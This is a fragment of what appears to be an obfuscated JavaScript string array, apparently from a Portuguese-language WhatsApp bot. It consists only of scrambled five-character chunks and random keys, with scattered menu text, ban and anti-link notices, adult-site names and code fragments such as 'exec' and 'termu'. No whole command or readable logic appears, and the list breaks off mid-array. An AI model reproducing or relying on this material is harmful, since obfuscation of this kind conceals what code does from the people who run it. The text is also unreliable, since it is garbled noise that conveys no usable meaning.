'ljyWx', 'Recol', 'safio', 'ZvfGu', "\nBair", 'QOlJG', "ig ze", 'AonUE', 'FqfEd', 'khoej', 'BRLmj', 'sykuf', 'QkSmv', 'JZMsP', 'ZwwEl', "o\n\n5 ", '✧፝͢⃟', "ja 😂", 'BhZlQ', 'lRGQG', 'vQzJv', 'ma|di', 'KfBpN', 'UKNnO', 'RBApP', "f \"sc", 'SUtax', "ma si", 'ELbzc', '.1-mo', 'pooOb', 'ose', 'gdnmt', 'proce', 'yGJAR', 'WORLD', 'kpuNM', 'quand', 'book', 'dpGUz', 'bUhpk', 'nXANM', 'NLSae', '*Ativ', " 0.\n\n", "DO LI", '_audi', 'avrão', 'Ndypf', "tava ", '*Nada', 'ONCRD', 'ca-mg', 'EtxaP', 'kOFwU', 'IgUdZ', 'eng+i', 'CBMEn', 'YSIqg', 'PPNFt', 'PudSX', "o! me", 'pubDf', "com p", "mum n", 'tcpQv', 'pBjGb', 'CdRar', 'yeiWX', "ds de", "éns, ", 'jjlUU', 'leza!', " DOUM", "ção r", 'kzDZb', 'qukYb', "u lad", 'nTBnc', 'seFSg', 'qtawP', 'ROKtf', "an -v", "al : ", 'ddgmV', '52199', 'KBGjk', " Disp", 's-bas', 'selMe', 'KosjE', 'gWPFJ', 'rmat=', 'WgpWa', 'avVPg', "\nPlac", 'BiDHY', "do já", 'VwAyt', 'fYJvR', 'jWgBp', 'ENCON', "s men", 'wOqHI', 'slowv', 'RgRAs', 'wVtYZ', 'lOReg', 'ZFdHo', '|4|1|', 'IhJIJ', 'VnOuh', "\n\n- 😇", 'upo', 'XKDjy', "rio t", 'consu', 'DLBGi', '15955', 'cmhHN', 'Dev/a', 'dfd62', 'spero', 'bdSuT', "o mom", 'xQSBS', 'XWvla', 'teWCH', 'wlzqv', 'HvGmX', 'OEDin', 'gunta', " o gr", 'siona', "𝐀𝐃 🎦", 'GKikt', "do, s", 'aIzTR', 'KoBTi', 'xJGcE', 'iKCXu', "JA FO", 'Coloq', "rar o", 'rwACU', "Se es", 'Inati', "ma fo", "go 1 ", "\nBio:", 'toso', 'VTJpC', 'mpart', 'qyiXZ', 'kgthO', 'vEpUm', "ia. A", 'suali', "o | h", 'Eatjv', "a lis", 'OVDSf', 'CyXRq', "sta m", 'Músic', 'Geqvy', 'ogos.', 'IlJrY', "no,\ne", "e adm", 'xPbBM', 'getIn', 'MAIS*', 'b4603', 'RCZHM', 'RsCCk', 'rmanc', "RO DO", 'files', 'gpipN', 'MJKcf', 'IxLwe', 'xtBip', "do: ", 'Epydy', "P ❄️\n", 'jogo6', 'srgJP', " Fake", 'kZigR', 'zlKVg', 'mQndM', 'nyfIa', '2|1|0', 'CkocD', "NGRY ", 'DUMqE', "iser ", "5 seg", 'TlRTr', 'PypxT', "100, ", 'qqYhI', 'IMEWQ', "A Leg", 'LpWxb', 'pes/%', "2 ven", "ão no", '252CG', 'HvdmB', 'qlSYn', "👾 」\n│", "[ Ava", "tao \"", 'TcmoB', 'bnSET', '4|1|2', 'itsav', 'zTGnA', "io ->", "so* ✔", "as do", 'ficaç', 'QCuPA', 'utras', 'GtsMg', 'Ifnva', "ades ", "á pag", '|1|0', 'fJjJd', "io e ", "  💨  ", '87051', " NOVO", 'sHqQS', 'eohir', 'HWNIA', "𝗥𝗔 🇯🇵", 'CHnGF', 'xlKEG', "-o. E", 'SVNGm', 'gBcxH', 'rado,', 'cWqyI', "ve\n\nE", 'MCfsF', 'LGYpq', 'velop', 'zEWQw', 'break', 'pzxiN', 'ale=t', "𝐑 𝐀𝐍𝐓", 'klmKP', 'arei,', 'CONVE', 'qxhrU', 'VdGIm', '•ID∆D', 'uUnMc', " mute", 'sjCxg', 'star,', 'eCvQL', 'MZRqY', 'zYHbB', "/3 pa", "a, em", 'ando.', 'sso.', 'DNQqu', 'GzihA', 'HHsIs', 'es.', 'gPfGH', 'jOgVz', "    【", "e a q", 'ILUHe', "E EST", 'DBYHn', 'VWAIk', "i que", 'eZauO', 'moTSk', 'ZCoaw', 'yTWnB', 'zcvVR', 'AFTvk', 'AUxic', 'coóla', 'NADAh', 'ono(a', 'ag2', "o\nTot", "-+\n\n©", 'g?tex', 'MZqvD', 'mDLgv', 'recus', 'CKmWQ', "nti F", 'NtlUg', 'attr', 'hcDEG', 'goxto', 'JkZeG', 'XwvlA', "xado ", 'IOS😂😂', 'ub.co', '244', 'lgSYC', 'kNRSX', 'bug', " infe", "a mús", 'hvIhT', "25. 🕹️", "RDE* ", '|7|5', "𝗭𝗔𝗪𝗔 ", 'JMvgH', 'kXkET', 'lete:', 'YGstb', 'IBdBu', " ou &", 'EReUV', 'ulo.', 'istas', 'mRJHk', 'cstyx', " dess", 'ORDER', "🍌\n   ", 'oDoMc', 'NuqPD', 'YDHtM', 'ar_al', 'ikaOg', 'ARJcY', 'vnWIw', 'rYrOL', '6f3f0', 'Gay', 'rasNz', 'xvide', "de Me", 'WdoAn', 'yqxOZ', 'lcqPl', 'UdOtX', 'eb51e', 'LquEM', 'SVyiI', "e nav", 'ZUTpG', 'AOARS', 'pedid', 'inclu', '𝐀𝐋𝐄𝐀𝐓', 'HBjoJ', 'RzExD', "vc em", 'UgVXt', 'cote.', 'oeiXb', 'KptJL', "️❬ ✔ ", "15. ❄️", "gem f", 'Gwmrb', 'uHLEK', "𝐊 𝐀𝐃𝐕", " *Gem", "24. 🕹️", 'IGkOl', 'cUcfR', "ndar ", 'goLDt', 'XSRmD', 'LqXrH', "Mais ", 'VEHOt', 'tUDJE', 'txxs/', "ONO:\n", 'oRDfU', "u, ao", "imo e", 'xudsL', 'xkQAl', 'ppUrl', 'PBlKu', 'KEOLh', 'lbghS', 'RSQfi', 'Vjvod', 'skEzt', 'v.com', 'wTErZ', 'Delic', '_ofc', 'rmZke', 'uRQrj', 'MrgSl', 'pleWe', 'AC-MA', " Cash", 'line.', 'otDsO', "gos d", 'TTDwl', 'twQna', 'ZAmFZ', "a cal", 'fpuGK', 'fio', 'JLEuj', 'tdowf', 'ordSQ', '16b98', 'coffe', 'IonIq', 'durac', "aixo ", "inha ", 'HYpHR', 'qKQaY', 'CkwlW', 'MANUT', "ld do", 'rOvsn', 'dsxOK', 'zUDgm', "ue us", 'FgklW', 'uGfWU', 'resou', 'Okqhi', "s, co", 'BOT~*', 'XBDAy', 'termu', 'on/da', 'cItoB', '999', 'Bttpu', 'ruuhI', 'ckera', 'Aviso', 'Bjmwv', 'isar?', 'eact-', 'attrs', "' não", '/spot', "𝐌𝐈𝐔𝐌 ", 'FmhHU', 'MMmTr', 'lgCiB', 'letra', 'LOGIN', 'lBlNg', 'Jncmm', "\n▢ *A", 'QLyGH', "th Su", 'MDHcP', 'RiBrT', 'jlFMw', "cima ", 'curre', "  🚀  ", 'ibpZR', 'cOWiF', " Forn", 'tylTn', "___\n\n", 'aRRYo', 'Txqhv', 'XWZxu', 'iac', 'Whats', 'EjvLv', 'ver', 'vkQsa', 'FJyAA', 'JYoco', ".0, s", 'GGJyT', 'pgHrE', '/png', 'ZnKwb', '/trac', 'PDCkJ', "eter ", "te. ", "ds 2 ", 'xBDmq', 'esper', "e uti", "r fav", 'lxJNl', "ou su", 'MRuvi', "de ro", 'pMyRU', "to em", 'ovido', 'm!!!!', 'nsfw/', "upo, ", "O & q", 'oXOYe', "𝐄 𝐅𝐀𝐙", "Ops, ", 'QaRFB', 'IMeih', "ior o", "do A ", 'expre', "𝐆𝐎𝐋𝐃 ", 'iITCn', "! 😊", 'cita', 'hador', 'SPsWx', 'Tkkik', "👻 •N𝜣", "u mui", "o uma", 'wIXfp', 'b30d6', 'rZBcv', 'TKohU', 'QUhJd', 'Slbrm', 'rvULV', 'TRpqU', 'eys', "De Al", 'city=', 'GenCf', 'IgqoR', "no es", "\n\n👮 𝐀", 'p.sti', "│+  @", 'a...*', 'Knipg', "gens ", 'YdTJf', 'CEmMv', "6. ❄️ ", 'Telef', 'QxBfm', 'ype', 'Anlog', 'mvypg', 'mkpom', 'kRfHc', "so, a", "o de", '/cont', 'RxyTG', 'AGRFc', 'WVkps', 'lIiwH', "e o t", 'CThGs', 'glyhy', 'alvez', " e va", 'RfUkK', "os qu", 'zpNUZ', " Casa", " some", "❌ 𝐑𝐄𝐒", 'AWDoT', 'gwAYD', 'meikc', 'QcPhq', "+18: ", 'sessi', "lds p", '*GOLP', 'fpcQY', 'guCyC', 'KKOJt', 'Lrklb', "NIDO ", 'NVRVy', 'MnnWv', "\n5 - ", "🚫 *LI", "-> At", 'dzjSl', 'Pergu', 'bViKY', 'wSPHN', "m:\n\n", "*, en", 'A_ONL', "tará ", "RIS \n", 'wqsOK', "reto ", 'oods', 'JjdFR', 'AXvfF', 'SzlbI', " 😌", 'GUlXC', 'BjEnn', 'MSEat', 'bro', "t  \n", "✼ Lis", 'alink', 'smiss', 'QRbVX', "🇯🇵 𝗖𝗛𝗜", "a a U", " 2: ", 'colhe', "em vi", 'RsgnU', 'tQpwR', 'AXZEv', "tre e", 'munid', " / ", 'TIBTF', " ESTÁ", "*「 - ", 'uyswq', 'LgMtt', 'exec', "ena! ", 'nAOKw', "seno ", 'Parti', 'Aguar', 'mPxeT', 'Accep', "-1:\n6", 'CHFE-', 'aKwxd', 'EjhMm', 'vqMui', 'résti', 'tXDZN', "tipo ", "84. ❄️", 'AsuRW', 'VVAGO', 'bZzRv', " cont", " what", "ja en", 'ante', 'pkxmv', 'ouAbu', "ens: ", "a o l", 'bsgbu', "a, pe", "o2 ", 'ZjFJw', 'pYSkI', ": +55", "r of ", 'CGrKt', 'bnmQv', 'SBcVW', 'VWggU', 'maXBa', 'yceFF', "o, po", 'alk', 'DQvpd', 'rrpFX', 'rqSaN', 'uJDnt', 'rDUHE', " anda", "e nov", "o\nPal", 'iQtJX', 'olão,', "ais u", " muit", "ubou ", 'vindo', 'randã', "e 30 ", "Para ", "mo se", "🕹️*\n  ", 'ymLNX', 'irgp', 'SEWgA', 'sTfQP', "do ne", "Só AD", 'Gado-', 'IfGhq', " de C", 'iGtqo', "ro é ", 'promi', 'pJurB', 'fLWEJ', "ei um", "PODE ", 'o-don', 'ObNUK', 'WCpUQ', 'HXIsY', 'ost', 'phokm', 'ivar*', "sica ", "e tem", 'YpVbF', "*\n│\n╰", 'rkMbW', 'miEGn', 'uIiqx', "ok?, ", 'qGKLm', "\n*ADM", 'ler', 'nDhfA', 'trans', 'Isgfr', 'XtPsu', 'LiJSE', "ake 0", "has q", 'rlZwl', 'jhcpG', '/tabe', 'perde', 'DeRhp', 'zWsHP', 'wYyBK', ", só ", 'CHSCV', "ar es", ", o q", "one r", 't.tea', 'vYhcE', "uisa ", 'UYjBk', 'DKSdQ', "AM DO", 'JvyDJ', "r\n\n*E", 'CnRqJ', 'wYkoU', '0|1|4', 'Talve', 'sca._', 's.jso', "o pre", 'rshjt', 'sua..', " o co", 'EOxlj', 'toArr', "éns p", "𝐍𝐓𝐈 𝐒", "A qua", 'aGFUX', 'OMIXq', 'hMZJz', 'Bikql', 'DkxDM', "deve ", 'ICKER', 'XLmdO', 'RfKDo', 'ma!', 'iwVKC', "m 1", "c2 co", 'CWEWP', 'zZzOb', 'Vpkrk', "m 4x,", 'UdfmW', 'EsYxF', 'cattx', 'f&tex', 'BSAtb', "\n🤖 *P", 'EYzJc', 'lets/', 'fWpId', 'atus:', 'rHTwf', 'tedBu', 'aYcIo', 'LGfCx', 'ário,', "\n*3 -", "gem, ", 'neve', "a pre", '-pt/t', 'nilYJ', 'ZakXC', 'xQCUW', '|3|5|', "es fo", " Clas", 'ações', "azer ", '.us', 'SWgbD', 'nrgHe', "ra pe", 'o3xA', 'utebo', "-_-_\n", "ma pa", "❄️ 𝐌𝐄𝐑", "21. ❄️", "C[1;", 'XHcEQ', "\n\nboa", 'EPzav', 'rukMo', 'ngoku', 'PvoBa', 'wSwSJ', 'BGABV', "𝐔𝐊𝐎 ❄️", " so\nd", 'úmero', 'album', 'WkrHX', "os\n", 'QOgkY', 'eFGNk', 'NNeYW', " busc", 'tao', "\nComp", 'eswzY', "❄️ 𝐌𝐂𝐋", 'hTmAq', "ez pa", 'IUMS*', 'GRHrI', "ens A", 'Svutq', 'play.', "*Que ", 'sDhcw', '00_Mo', 'n/nsf', 'hcTYi', "ção d", 'TNghh', 'VWACj', "a Rib", 'ETUAR', 'addwh', "\n║✼ _", 'da_vi', 'bmcRU', 'pUFmb', 'mLakB', " 1: ", 'FCOJq', "ar.. ", "em à ", '3|1|5', " NARU", 'llCOA', 'app.c', 'jReDc', 'máxim', '48b6f', 'tyBog', 'YcjRB', 'wXOMj', 'uXeDR', 'ymYva', 'qwsVr', 'hIwKT', 'EIHYN', "\n\n*⚠️A", 'HA-zR', 'NMkdi', "a »", 'tmzTS', "TA SA", 'uRHnP', 'JMKUP', 'bLJah', "🪬 𝐌𝐄𝐍", " mand", 'wEaLB', 'abéns', "u um ", 'sNsre', " eu e", 'mLIPs', 'RDbek', 'deter', 'dbzIh', " 𝐁𝐑𝐄𝐍", 'uJOIG', 'linef', " ou p", 'rsion', "32. ❄️", 'JDPKv', 'PCCFa', 'ZLsSL', 'dd985', 'nZLeW', 'ZBiMc', 'dkBSX', '￣￣￣￣￣', " ao d", '-4309', "hip f", 'efini', '759f3', 'bqGBU', 'PgVCv', 'uOWSr', 'evglb', "🔎 𝐌𝐄𝐍", 'EPRji', 'eUxSo', 'yHAAt', 'SDTpx', "foi p", " sua ", 'BWHNE', 'NeOeQ', 'DnwAM', 'sJdmC', 'BquDL', 'on/pr', 'r_Fri', "te oq", 'SLpHR', 'ykYzk', "tem n", 'BbuHC', 'AcNLG', 'guida', "eceu ", 'INXej', "ade /", "s: Us", 'talin', 'CcccH', 'nQxWy', "🟦🟦🟦\nB", 'wKZwk', 'defau', 'parse', 'HGAig', "dio, ", 'khvsr', 'nce_s', "de Hu", "IDO O", "OKA ❄️", 'gGBvb', 'andom', "ens e", 'kTeij', 'p-sto', 'ieHio', " com:", 'ndos,', "𝐀𝐒 🪅", 'pLVkg', "ra O ", " na c", 'BWAxH', "va 🥴", 'FQYcP', 'faYCd', '(a)..', 'KSjgd', 'FIANT', 'SUÁRI', "10, p", 'iTYnJ', 'eados', 'dcc34', '𝐀𝐍𝐓𝐈𝐂', 'eJHSp', "𝐀 ❌", "i con", "one a", 'IlAKR', 'kahBx', 'Iuwtv', 'IxesN', 'wJjuY', 'nXCKj', 'iTquM', 'ntbQq', "r, do", 'vIpVJ', 'onGhk', " meio", 'aWDHQ', 'ogo..', 'dDjrj', 'GDblu', 'eko', 'setpi', 'IrYwz', " os t", "\n║\n║\n", "ih2 e", 'ZHDJp', 'mPEgR', "ndo 0", 'ePqLL', 'BAGdN', "\n🐂 *N", 'aNQeF', 'hqQey', 'o2=', 'potiy', "e pri", 'kseAV', 'UIDWd', 'Chave', 'eseta', "eu nú", 'vDWER', 'qEyqf', 'nqkxB', "𝐎𝐓𝐀𝐋 ", 'dUARD', 'sUnJI', 'kDTdC', " o(a)", 'TrCZL', "% [⛩️]", "e mul", 'ática', "🔻 Tem", 'PsOZf', "ra mo", "nado ", 'itali', 'cyKvO', 'uFXyY', ", seu", 'tUOCo', 'CmQJw', 'EtFWi', "ite \"", 'CBirv', 'nkgp', 'RmCJM', "17. 🕹️", 'tar', "   RA", 'UUUgt', 'fgvgu', "o : @", 'IVsNN', 'mitir', " ☁︎. .", 'ntlEi', "imo r", 'inido', 'SxLKa', 'EuTET', 'nEFBl', "0) p/", 'ZYhYK', 'BChxv', " fina", "O SEU", 'tRlhS', "𝒖𝒊𝒔𝒂 ", 'Xdpcj', "Sua t", " 👾", 'meros', ":v hi", 'udo', "o / P", 'YGjWr', " fará", 'CDQPl', 'cvwRV', "~\n\nO ", 'templ', "um ex", 'strar', 'UVMfM', "tão j", "Dia*\n", 'spons', "o 200", 'osmar', 'nCRBA', 'ObBQy', 'CiRxz', 'tncpO', "O jog", "ição ", 'agTgR', "💎̸͙ ⃝̸̸⃔͜❆̸͙", 'WsfpJ', 'jpEVK', " teve", 'AVBPv', 'Kjfpz', 'IfEEV', '99-99', "ts te", 'JVLzZ', ": wa.", 'it;q=', 'aHTWQ', 'orFqI', 'DxyAW', 'TTQzg', 'JZHfR', 'subje', "p bra", 'ZQTTE', 'abLTZ', 'EefSG', "ig fr", 'tvtwl', 'qkPnX', 'mEadq', 'nyurl', 'qsYax', "io ma", 'xhILm', 'zdCKK', 'tBaRx', 'tema.', 'lVZCk', '9dba2', "a em ", 'rmato', 'YfuTx', 'WtPcd', 'GjIQV', 'UBLOI', " ( Ob", 'PcWqb', "𝐍𝐇𝐀 ✅", 'hKfgm', 'FhhNO', 'OmOQl', 'cale', 'pTWXa', 'KgJEN', 'orreu', "var\no", " e su", " uma ", 'unc(i', 'keyre', 'YplJI', "bar 😡", 'bvYdw', "VOS S", "ON ❄️\n", ". 📍 T", 'LGAAs', '╍❆╍╯', 'ZekCm', "❌ 𝐃𝐄𝐒", 'UqKJS', 'mSFIZ', 'ockea', 'SxiHm', " Atrá", 'fOTmL', "𝑬𝑶 3 ", "𝐥𝐡𝐚 𝐒", 'lYXvM', 'fy-fi', "s ou ", 'mTCLm', 'ZKXIt', 'gBPAJ', 'RaQFM', 'iUiXE', 'Prova', 'rinca', '𝐋𝐈𝐒𝐓𝐀', 'URUPI', "gem v", 'VVakj', 'rempr', 'qqeCk', 'PZZFJ', 'rio.', 'kINgT', 'ULukQ', 'iKzaP', " bran", 'nyzdk', 'So_Ad', "lo: ", " letr", 'BnyFv', '𝐔𝐊𝐈🔥', "𝐎𝐂𝐄̂ 𝐏", 'msoPJ', 'gQmqw', 'eseja', 'addli', 'k_vid', " tr", '://lo', "┃✼❄ @", 'OPHGR', '480p', "o reg", 'tab/u', "9. 🟢 ", 'QkwYR', 'DiXGH', 'mi.js', 'User-', 'mYTOc', 'pix', 'qOnYD', 'ybfaE', 'semoj', 'Lfmev', 'vlYGN', 'fy_au', "TA DO", 'pXAzZ', 'FKoqz', 'htPqK', 'hetei', "ri 🔞\n", 'qJQkD', '.....', 'ERCKg', '𝐀𝐃𝐄𝐈𝐑', 'hMbtw', 'LINDÃ', 'zerar', 'Figur', 'Sbbzv', 'NBMAj', "nei, ", "íso, ", 'kqKrZ', 'eSHfY', 'hAyJd', "inal ", "𝐀𝐊𝐄 ✅", 'Eita!', 'gOwfU', 'herli', 'gar', 'ESDEA', "is ch", "ue só", 'popul', "ts he", 'banin', 'JCVrF', 'aZgMD', "*    ", "e: Ex", "io, v", 'PQMzL', 'Revel', 'aYgxn', 'dYfnm', 'JkdDT', 'egFnc', 'WpZqs', 'AMAND', 'EDnKv', '.api.', 'VEvkN', 'fHuUb', 'VyIdE', "vra: ", 'UtCFT', "𝐄𝐒 🇯🇵", "rei m", '83de9', 'GExOw', '95400', 'lyrOq', 'e5289', 'letro', ". Pro", 't0x7Z', 'eraci', "ts ch", 'mover', 'GuLTF', 'TmeyT', '//sab', 'eTRIs', 'aFpJG', 'rDzbD', 'lixo', " ~\n@", "i Est", 'iGkMe', "O DEF", 'jIdBW', 'stPay', 'rBpZJ', "𝟬𝗣 🎥", " GOLD", 'LUFft', 'DYcFK', 'ouyHY', 'KpIcG', 'rreto', 'as/ma', "ng Sc", " \n║ 🤗", "a que", 'quint', 'zutfP', 'fhxGc', 'eDesc', 'nuGTU', 'unade', "O ❄️\n", 'qrqSK', 'AyDFF', 'JuJEe', '//168', 'pLHDD', " ocul", 'legen', 'GmCAp', 'id_gp', 'txZlL', 'wqGEo', " *lev", 'jfkBH', 'slJHc', "uel e", 'hCXLz', '.0.te', "o pla", "_ts m", 'ksts', 'dio.m', 'PUWAy', "s Dia", 'iser.', 'VSrZg', 'PdBqV', 'KxvgT', "e o á", "gou k", "ENU D", 'sOMHa', '|13|1', 'XNNWx', 'NtBEL', 'Campo', ':cria', 'iBGdB', 'veu', 'Iagab', "\n\nEm ", " Only", 'BXoDo', "𝐍𝐓𝐈 𝐍", 'antie', 'DmLwZ', 'GGVGY', 'EktqD', 'hYFGG', '的⼿机和我', 'gaHtX', "s gol", 'IHlRB', 'e+Idl', "Não c", 'xAzQb', 'KQHSn', 'YDjTZ', 'skWkH', 'OvJAe', ".:* ", 'jPuxq', "\n+55 ", 'LNYto', 'hMFyl', 'OHDox', "𝐈𝐍𝐀 𝐌", 'nQTlK', 'ZquIY', 'icas', " poré", 'HVtuW', 'Evrta', 'Mhrqp', '1fa41', 'ydqAK', 'HGZSD', 'NDGQW', "40. ❄️", 'mFNnX', 'ngGju', 'sseEW', 'wvgJR', "ira r", 'DADE%', 'a59ee', 's/Feh', 'dJkwG', 'nívei', '/aist', 'hQyys', " ou *", 'krqzT', 'URINH', 'avelm', 'el2', 'xqyaz', 'RADOS', 'ZhtXJ', 'qApLL', 'PTtGB', "s (10", 'X24OP', 'wIVt7', 'hgdax', '_bZmS', 'zxIqX', "𝐍𝐃𝐎𝟐 ", "0 seg", 'zCijt', 'MToRr', 'WjJeh', 'GyhLN', 'FQelW', "❄️ 𝐁𝐀𝐊", "𝐈𝐑𝐀 ❌", 'WXtAU', 'ueCGU', 'mGfVm', 'dZlON', 'AruJJ', 'onare', 'hfSun', 'uuNIm', '.php?', 'DoFgX', 'Nenhu', 'mFXgq', 'icada', 'mes3', 'JwDtj', '𝐀́𝐋𝐎𝐆𝐎', 'IckAC', 'YTntr', 'grafi', 'rnWTI', 'smyJP', '💡_*', 'YZOaj', 'rEDFZ', 'ançan', 'a0c4d', "e msg", 'hogQp', "bom p", "é com", 'DUCbq', "\n- [ ", "to qu", " big ", 'cFNlN', "sso o", 'UAsYI', 'MeyKZ', "r do ", "S ROU", "\n- Ur", " Real", "ão di", 'PLsI7', "𝐃𝐈𝐔 🔥", 'CuRfJ', 'raSeN', "ntão ", 'JTgPw', 'yrhrp', 'upcYU', "🇯🇵 𝗦𝗔𝗚", "AI ❄️\n", 'tipv2', "\n┌───", 'rMSXv', 'titia', 'bmDgs', 'WEaUC', 'xGKWU', 'ontêm', 'PustV', 'rQLES', 'OINds', 'Npxsd', 'VCASO', 'dXIVH', 'OS/au', 'JVlqW', "📍 Cri", "é ou ", 'dvbkH', 'scoço', '24h', 'cFNAh', 'jGmLK', 'FNGzb', 'AAjaK', "\nApar", 'le/uw', "hool ", 'fUbhD', 't-lef', "ia se", 'tecta', 'ovQmP', 'BELA/', 'AqHtU', 'iYKDd', "is no", "o lim", 'dias,', 'hJThE', "HADO ", 'aEFeA', 'oLrhp', 'infoc', 'onysC', 'KSDMV', 'TmyDn', 'waUpl', 'YdALt', 'RzJlT', 'ligEu', 'HgxpG', "N ou ", 'WGgzn', 'IFmSm', "𝐀𝐐𝐔𝐈 ", 'ZhOBe', 'Nlzrf', "rv\n", 'numer', 'icfnb', 'RoIxk', " d pa", 'ZSOwe', "ta pe", "𝐒 🔞", 'zjewr', '1ea5d', 'ensag', " 🌹 DE", '@xct0', 'wvkUX', "\n\nqua", "r-f n", " 𝐍𝐎𝐌𝐄", 'PzwwD', 'SvHqi', 'ey=ga', " 81", 'ZWiPb', 'fzqRi', " a mú", 'LKjBo', "io at", "\n￣￣￣￣", "𝗣 🎥\n1", 'VoWtH', 'dUaeu', 'CgoCJ', 'Tamva', 'xFLRR', 'pgJIc', "le co", 'vtOGr', 'yoTRZ', 'fUTBS', " Lost", " caso", 'Artis', 'block', 'IYToe', 'chanc', 'EexOk', 'ornad', 'ogo', 'JiOIG', 'arjr', 'iqgwj', 'TEL;t', 'iNRJY', 'aMhPg', 'xdwAH', 'VCgHT', 'ssErK', "em do", "e em ", "s💠: ", " Drea", " Carn", '/MM/Y', 'nBLHH', 'BrUIu', 'zqIJR', '-5661', 'VKjBT', 'rdcor', 'eSele', 'sZrAj', 'nvsWi', "% @", 'GPrGl', ", boa", "ING\n(", 'trado', 'OKMEq', 'aaaa', 'mnopq', 'XvUME', 'gtNJr', '|1|6|', 'KFDFr', 'eEqQO', " aven", "i1\nNã", "roa U", "e pro", 'zLGSw', 'SyFag', "eito\"", "W 🔞\n", '𝐒𝐇𝐈𝐑𝐀', " do c", 'mata', "31d =", 'AsfpB', 'RskzY', 'EotkO', 'File', 'alvar', 'SNTqu', 'Fvhpw', "o núm", "o. Es", 'hYRhQ', 'dicio', 'to...', "ate T", "Já ex", 'FmbJy', 'DoqmG', 'Aqqcs', 'ITSAN', 'ERRO,', '1|0|4', 'XYWxj', " ver,", 'RmHec', 'var*.', 'VRDLg', "ar se", "🔞 𝐁𝐑𝐄", 'vhGeU', 'qXquQ', 'ZvmNb', 'epiec', 'mPhZP', '=fps=', 'dMTYK', "║ 〔 ", 'ativo', "obal\n", 'wwkos', 'baixo', 'RwvZt', 'bECfq', 'KKrVF', 'zmZSD', '7%25C', 'ARjBF', 'PLeDm', 'msg.j', "▀╬\n◥█", '?text', 'dBbxL', 'WDBEu', 'lYCVn', 'pergu', " 🅱🅴🅼 ", 'MkrzT', 'vbpMh', 'PXIrQ', 'lwHAo', 'ezwdh', 'WpgwD', 'vo-ce', 'setar', 'antia', "a ver", " ESDA", "Sua d", 'fEBAa', "xo já", 'SrHoP', 'ombat', 'quiag', 'ATUAL', 'vumrc', 'KEtiR', 'zEfFf', 'lYSqW', 'xuwgk', 'JgWUo', 'zUMKa', 'jgGsB', 'hKmqW', 'JWBvG', 'nuto,', "S 5 M", 'ta.', 'FrKRg', 'emecr', 'sOFJK', 'qlkyI', 'goeTW', 'FzDeK', "har é", 'on/Us', " 🌀", "🇯🇵 𝗢𝗡𝗘", "um áu", 'sZXfW', 'KevLQ', 'QKWJZ', 'kzlcZ', "ig ra", 'jXivm', 'SJUfi', 'vGlZZ', "h of ", 'bwFWd', "gb nã", 'lENVC', 'ctjnm', 'kOsHV', '*Esco', "r sai", "ocê u", 'XngMy', '*Nehu', 'qOzGs', 'emovi', '3.1.0', 'DkHqg', 'PcYjz', "ssui ", 'ecmd', 'usuár', "ora q", 'oURki', "kid b", 'UEzHl', 'clone', 'zsqgF', "é tu ", "o sti", '✼┉═༺◈', "║\n║ Q", "67. ❄️", 'Pro&t', "e mac", " fugi", 'JcoAe', 'RaNnJ', 'ZQLYH', "ou ch", 'ncion', "ra sa", 'bmwee', 'hDUiy', 'RpNpm', 'YqXcV', 'EZSRu', 'ontra', 'gCInm', 'YnmSV', 'KNfyA', 'jZNvD', '.75.9', "? exe", 'ão#', 'IRAVE', 'yjRhZ', 'getMo', "u:\n", "7. 🟣 ", 'qmWfL', 'hSExj', 'gEsKI', 'Llhgy', 'rAddM', 'IhzYY', 'NqURN', 'XJDlN', 'lWAqO', 'ZiruO', 'XSUaG', 'CcOpI', 'fZJGB', 'or/js', " e só", 'qwqmt', '&apit', "𝖠𝖰𝖴𝖨 ", 'pipe', 'vatNr', 'DwjXo', " modo", 'ZuacG', " 🇹 🇦 ", 'Shiwm', 'ndo', 'sCTzo', 'BqWpH', " da f", "\n\t\t\t\t", 'autof', 'aestr', 'namWM', 'LQGWS', 'FVEvc', "me do", 'assou', 'JeJFv', 'YSLGK', 'ted_c', 're.co', "i é u", "ppt p", '8|4|3', 'CHnEl', "ção |", "te co", 'JwnHF', 'pnWcc', 'qeZeQ', 'pos/', 'nuQOO', "𝐎 🔥", 'eljBt', 'hijkl', "stá t", '4|0', "l pra", "⁸\n ──", 'dYXse', 'Link', 'sphNC', 'aFZpc', 'rBCSZ', '7bc9a', 'YJRNm', 'obYWB', 'wPRwD', " => {", "her u", 'RjkkY', '3|2', 'LkwIL', 'lZtwA', "🤖 *So", 'Qjbao', 'MykXU', 'KtZHT', 'kyYPP', 'eo/', 'SBttm', 'menos', 'unmut', 'PMYrG', '𝐂𝐀𝐌𝐏𝐎', 'uUetW', 'DodFm', 'vrão:', 'BtDip', "\n\nPri", ',fps=', 'pOlHQ', 'qiCsE', 'glykL', 'OnEeT', 'ns..', "N 🔞\n", 'gvBpo', "r o v", "𝐒 🗣️", 'alter', "o, di", "\nCida", 'nnfDT', '77r9t', " nasc", "19. 🕹️", 'DPlcs', "O nom", 'xJfPf', 'rteio', 'Ehvbu', "ETH1 ", "Um Bo", 'VzAhx', 'ciado', "o) fo", "\n┆   ", 'tBkHh', "rá ba", "lds, ", 'Desvz', '───', " info", "Deu e", 'YHoIj', "🤖 𝐀𝐏𝐈", "l ou ", 'QvrHW', 'ext=', 'ksnsQ', 'BBWPm', "TE1 ❄️", 'rXMyk', 'NTdwR', 'FLXcr', "URI ❄️", 'geAdd', 'OPRef', 'szzYk', "e.\n\n_", "odo s", 'KspMI', 'erMes', 'dGSnL', 'qnmVX', 'PHhwQ', 'GwbQI', 'NtXJI', 'pornh', 'tblNn', 'laDUH', 'begWe', 'NCjRs', "l bai", 'LbJNw', "io ac", 'xHUKv', 'vPsuE', 'GsUYt', 'fAtPz', 'NJCtM', 'EqEcw', "ste e", '--at-', 'ion=q', 'fBUXQ', 'mVhkF', 'QtJlp', "r gan", 'gqDtn', 'mmKSa', "𝐈 𝐁𝐑𝐈", "𝗡𝗔𝗗𝗘 ", 'vMIah', 'iSibI', 'SuRAW', 'YEypE', 'EkiIX', "ᴀ🍁\n  ", 'Ndjzj', 'GQrCt', '6589935TDDLzP', 'tESoU', 'StRZi', 'BIcmZ', " -c:v", 'Preto', 'uLENP', "ias p", 'date', 'WvaPZ', "a?\n\n「", "e apo", 'MMvbq', 'prêmi', "er co", 'DdvKL', 'bbmTs', 'CxhYn', "ntar ", '*NÓS,', 'qLcEV', 'IEBZp', "𝟒 🔞", 'Igzao', 'esdea', " o @", 'VUQXI', "is us", "ou: ", "-map ", 'gle.c', "\n\n🕹️ L", 'frWZQ', "da Mú", "\n\nCom", 'EJIbp', 'vOzWU', "📁 𝑫𝑶𝑪", 'jdepA', "⚠️ A r", 'Parab', "ix di", "ap we", "sar s", 